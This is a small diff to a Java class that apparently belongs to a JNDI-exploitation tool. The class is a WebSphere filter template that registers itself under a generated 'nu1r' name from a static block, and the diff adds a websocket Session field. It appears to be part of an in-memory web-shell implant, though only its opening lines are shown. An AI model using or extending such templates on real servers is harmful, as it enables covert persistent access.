@@ -1,12 +1,16 @@
 package com.nu1r.jndi.template.Websphere;
 
 import javax.servlet.*;
+import javax.websocket.Session;
 import java.io.IOException;
 import java.lang.reflect.Method;
 import java.util.EnumSet;
 import java.util.List;
 
 public class WSFMSFromThread implements Filter {
+
+    public Session session;
+
     static {
         try {
             String filterName = "nu1r" + System.nanoTime();
